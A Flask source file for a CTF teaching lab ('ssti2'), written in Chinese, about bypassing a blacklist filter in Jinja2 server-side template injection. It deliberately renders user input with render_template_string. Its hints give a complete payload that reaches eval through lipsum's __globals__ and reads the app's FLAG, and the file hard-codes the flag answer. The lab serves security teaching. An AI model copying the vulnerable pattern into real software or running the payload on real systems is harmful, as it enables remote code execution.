# -*- coding: utf-8 -*-
"""
ssti2 · Jinja2 模板注入 · 过滤绕过（SSTI 第二课）
================================================
背景：  上一关（ssti1）被打穿后，开发加了「安全过滤器」：昵称里出现
        _  .  '  "  config  self 直接拦截，然后再进 render_template_string。
考点：  黑名单挡不住 SSTI —— 把危险字符串挪到 URL 查询参数里，用
        request.args + |attr 过滤器 + [] 变量索引在模板体内完成整条链。
运行：  python app.py            （默认 http://127.0.0.1:5002/ssti2/）
集成：  由 runtime/flask_challenges.py 以 Blueprint 挂到 /ssti2。
"""
import html
import os

from flask import Blueprint, Flask, request, render_template_string

FLAG = os.environ.get("SSTI2_FLAG", "flag{ssti2_bbe91042}")

# 「安全过滤器」：拦截这些字符/词（大小写不敏感）
BLACKLIST = ["_", "'", '"', "config", "self"]

bp = Blueprint("ssti2", __name__)


@bp.route("/", methods=["GET"])
def index():
    name = request.args.get("name", "")
    rendered = ""
    blocked = None
    if name:
        low = name.lower()
        for word in BLACKLIST:
            if word in low:
                blocked = word
                break
        if blocked is not None:
            rendered = "🚫 安全过滤器：检测到禁止字符/关键词「%s」，已拦截！" % html.escape(blocked)
        else:
            # ---------------------- 漏洞仍在这里 ----------------------
            # 过滤了常见关键字，但输入依旧被拼进模板源码
            try:
                rendered = render_template_string(
                    "欢迎回来 <b>__(" + name + ")__</b>，祝您购物愉快！"
                )
            except Exception as e:
                rendered = "模板渲染出错：%s" % html.escape(str(e))
    page = PAGE.replace("__NAME__", html.escape(name, quote=True))
    page = page.replace("__RENDERED__", rendered)
    page = page.replace("__BLOCKLIST__", " ".join(html.escape(w) for w in BLACKLIST))
    return page


PAGE = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ssti2 · Jinja2 过滤绕过 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">SSTI · 模板注入 · 第 2 关</span>
<h1>欢迎语生成器 2.0 —— 过滤绕过</h1>
<div class="meta">难度：★★☆☆☆ 进阶 · 关卡 ID：<code>ssti2</code> · 运行时：Python / Flask + Jinja2</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>上一关被打穿之后，开发连夜上了「安全过滤器」：昵称中出现 <code>__BLOCKLIST__</code>（转义显示，含下划线、引号与两个关键词）任意一个就直接拦截。过滤之后的输入<b>仍然</b>会被拼进 <code>render_template_string</code>。</p>
<p>flag 还是在 Flask 应用配置的 <code>FLAG</code> 字段里。过滤是死的，模板上下文是活的——想办法绕过去。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>会员昵称：<input type="text" name="name" placeholder="{{7*7}} 还能用吗？" value="__NAME__"></label>
<button type="submit">生成欢迎语</button>
</form>
<div class="result"><div class="t">渲染结果</div>
<pre>__RENDERED__</pre></div>
<p style="color:var(--dim);font-size:13px">提示：拦截只针对 name 参数本身；页面源码已给出（见下方），黑盒白盒结合玩。</p>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>黑名单为什么挡不住 SSTI</b>：过滤器只能看到「字面字符」，而 Jinja2 的表达能力远不止一种写法：</p>
<table>
<tr><th>被禁的写法</th><th>等价替代</th><th>说明</th></tr>
<tr><td><code>obj.attr</code>（点号取属性）</td><td><code>obj|attr("attr")</code></td><td><code>attr</code> 过滤器等价于 getattr</td></tr>
<tr><td><code>"字符串"</code>（引号）</td><td><code>request.args.x</code></td><td>把字符串放到 URL 参数里，模板体只引用变量</td></tr>
<tr><td><code>{{config}}</code>（关键词）</td><td><code>lipsum → __globals__ → __builtins__</code></td><td>换个门进：通过函数对象拿到整个模块命名空间</td></tr>
</table>
<p>本关核心代码：</p>
<pre>BLACKLIST = ["_", "'", '"', "config", "self"]      # 大小写不敏感地拦截
if any(w in name.lower() for w in BLACKLIST):
    return "已拦截"
render_template_string("欢迎回来 &lt;b&gt;" + name + "&lt;/b&gt;...")   # ← 过滤后仍然进了模板源码</pre>
<p>还有一个坑值得注意：Flask 注入模板的 <code>url_for</code>、<code>get_flashed_messages</code> 这些函数名<b>自带下划线</b>，本关直接被拦；Jinja2 自带的 <code>lipsum</code>（生成占位文本的函数）名字干净，而 <code>lipsum.__globals__</code> 里就有 <code>os</code> 和 <code>__builtins__</code> —— 它是绕过下划线黑名单的经典跳板。</p>
</section>

<section class="card">
<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
<details><summary>提示 1：先确认注入还在</summary><p>输入 <code>{{7*7}}</code> —— 这些字符都不在黑名单里。回显 <code>49</code> 说明 SSTI 依然存在，只是「拿 config」的老路被关键词+下划线+引号堵死了。再试试 <code>{{url_for}}</code>，你会发现连 <code>url_for</code> 这个名字都过不了滤（自带下划线）。</p></details>
<details><summary>提示 2：模板里能拿到 URL 参数吗？</summary><p>能！<code>request.args.参数名</code> 在 Jinja2 表达式里可用，而 URL 查询字符串<b>不经过</b> name 的黑名单过滤。把 <code>__globals__</code>、<code>eval</code> 这些「违禁词」放到 URL 参数里，模板体内只写 <code>request.args.xx</code>。同时换一个名字干净的全局函数当跳板：<code>lipsum</code>（Jinja2 自带，无下划线），<code>lipsum|attr(request.args.p)</code> 且 <code>p=__globals__</code> 能打印它定义模块（jinja2.utils）的整个命名空间，里面有 <code>os</code>、<code>__builtins__</code>……</p></details>
<details><summary>提示 3：完整 payload</summary><p><code>/?name={{(lipsum|attr(request.args.p))[request.args.b][request.args.e](request.args.c)}}&amp;p=__globals__&amp;b=__builtins__&amp;e=eval&amp;c=__import__('flask').current_app.config['FLAG']</code> —— 模板体一个违禁词都没有，全部危险内容藏在查询参数里。最后那个 <code>c</code> 就是交给 eval 执行的 Python 代码：读当前应用配置里的 FLAG。（注意过滤器表达式后不能直接接方括号，先用一对括号把 <code>lipsum|attr(...)</code> 包起来。）</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="/ssti1">← 上一关：ssti1 · Jinja2 基础</a><a href="/ssti3">下一关：ssti3 · Twig →</a></nav>
<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=ssti2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
"""


def create_app(url_prefix="/ssti2"):
    app = Flask(__name__)
    app.config["FLAG"] = FLAG
    app.register_blueprint(bp, url_prefix=url_prefix)
    return app


if __name__ == "__main__":
    create_app().run(host="127.0.0.1", port=5002, debug=False)
